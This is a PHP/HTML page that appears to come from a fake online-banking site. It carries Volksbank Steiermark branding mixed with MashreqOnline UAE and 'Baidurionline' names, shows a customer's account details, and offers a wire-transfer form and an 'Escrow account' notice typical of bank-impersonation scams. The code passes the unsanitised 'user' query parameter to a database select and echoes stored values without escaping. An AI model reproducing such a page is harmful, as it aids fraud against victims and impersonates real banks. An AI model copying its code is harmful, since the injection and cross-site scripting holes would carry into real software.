<?php
session_start();
?>

<html>


<head>
<title>Volksbank Banking - Requirements</title>
<link REL="STYLESHEET" TYPE="text/css" HREF="css/cmn/default.css"/>
<meta http-equiv="" content="5">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

</head>
<body background="images/mol-samsung-bg.jpg">
<table width="780" cellpadding="0" align="center" cellspacing="0" border="0">
	<tr>
  		<td colspan="2" align="center" valign="top"><img src="images/mol_head_uae.jpg" alt="MashreqOnline UAE" width="780" height="79"></td>
	</tr>
</table>
<table width="780" cellpadding="8" align="center" cellspacing="0" border="0" bgcolor="white">
	<tr>
  		<td width="110" align="left" valign="bottom" class="PageTitle">Account Details</td>
		<td width="363" align="right" vAlign="top" class="SuperLinks"><strong>&raquo; <A href="logout.php">Sign Out Home | </A></strong| <A href="privacy-policy.htm"> Privacy Policy</A>| <A href="service-terms.htm"> Service Terms</A>| <A href="security.htm">Security</A></td>
        
      <td align="center"  style="background-color:#2042eb; color:white;" ><br>
      TRANSFER FUNDS
         </td>
         
	</tr>
	<tr>
    <?php
include_once 'includes/dbMySql.php';
if(isset($_GET['user'])){
		$cat_id = $_GET['user'];
$con = new DB_con();

$res=$con->select($cat_id);


while($row=mysql_fetch_row($res))
{ 
?>

		
        
                            
                         
		<td colspan="2" align="left" valign="top" >
        
        <img src="../admin/images/<?php echo $row[14] ?>" width="200" height="200" ><br>
		<strong><?php echo $row[4] ?></strong><br><br>
		<b>Personal Details:</b>
		<ul>
		<strong>Date of birth:</strong> <?php echo $row[5] ?>
        <br>
        <strong>Nationality:</strong> <?php echo $row[6] ?> 
        <br>
		<strong>State:</strong> <?php echo $row[7] ?></li> 
<br>
		<strong>City:</strong> <?php echo $row[8] ?>
<br>
		<strong>Account Type:</strong> <?php echo $row[9] ?>
        <br>
        <strong>Account Number:</strong> <?php echo $row[10] ?> 
       
        
        <br>
        <strong>Reg. Date:</strong> <?php echo $row[12] ?>
        <br>
        <strong>Account Status:</strong> <?php echo $row[13] ?>
        <br>
        <strong>Email:</strong> <?php echo $em = $row[15] ;$_SESSION['em'] = $em;?>
		</ul>
	
		<br><br>
	<hr>
		<td width="242">
        
        <?php }}?>	
        <table class="table m-table table-bordered table-hover table-heading" >   
	<label>Kindly fill the form below</label>
    <form method="post" action="proceed2.php?user=<?php echo $_SESSION['user']; ?>">
    <tr>
    <td><label>Account Name</label>
    <input type="text" name="accname" placeholder="Account Name" required>
    </td>
    <td><label>Bank Name</label>
    <input type="text" name="bank_name" placeholder="Bank Name" required>
    </td>
    </tr>
    <tr>
    <td><label>Account Number</label>
    <input type="number" name="accno" placeholder="Account Number" required>
    </td>
    <td><label>Routing Number</label>
    <input type="number" name="rout" placeholder="Routing Number" required>
    </td>
    </tr>
    <tr>
    <td><label>Bank Address</label>
    <input type="text" name="bankadd" placeholder="Bank Address" required>
    </td>
    <td><label>Receiving country</label>
    <input type="text" name="rcoun" placeholder="Receiving country" required>
    </td>
    </tr>
    <tr>
    <td><label>State</label>
    <input type="text" name="state" placeholder="State" required>
    </td>
    <td><label>City</label>
    <input type="text" name="city" placeholder="City" required>
    </td>
    </tr>
    <tr>
    <td><label>Zip Code</label>
    <input type="text" name="zip" placeholder="Zip Code" required>
    </td>
    <td><label>Transfer Amount</label>
    <input type="number" name="tamt" placeholder="Transfer Amount" required>
    </td>
    </tr>
    <tr>
    
    <td>
    <input type="submit" value="Proceed" name="pro" >
    </td>
    
    </tr>
    <tr>
    <td>
    </td>
    <td><label> '' Please note that you can only transfer the total amount out of your Escrow account at a time ''</label>
    
    </td>
    </tr>
    </form>
</table>
      
        </td>
								
	
		
		<td width="1"></td>
        
	</tr>
	<tr>
    
	  <td colspan="2" align="center" valign="top">
      We maintain security standards and procedures to help prevent unauthorized access to confidential information about your account through Baidurionline. Our web servers are 128bit SSL protected. This means that all your sessions to and from the bank over the internet are encrypted using a 128 bit key. The 128 bit encryption is the highest form of commercially available encryption.
         </td>
         <td colspan="2" align="right" valign="top"><br>
         <label>Click here to request for loan</label>
		  <form name="form1" method="post" action="">
          <input type="submit" value="Request for loan">
          
	    </form>
         </td>
         <td colspan="2" align="left" valign="top"><br>
		  
         </td>
         
	</tr>
    <tr><td colspan="2" align="center" valign="top"><br>
		  © 2018, Volksbank Steiermark AG
         </td></tr>
</table>
</body>


</html>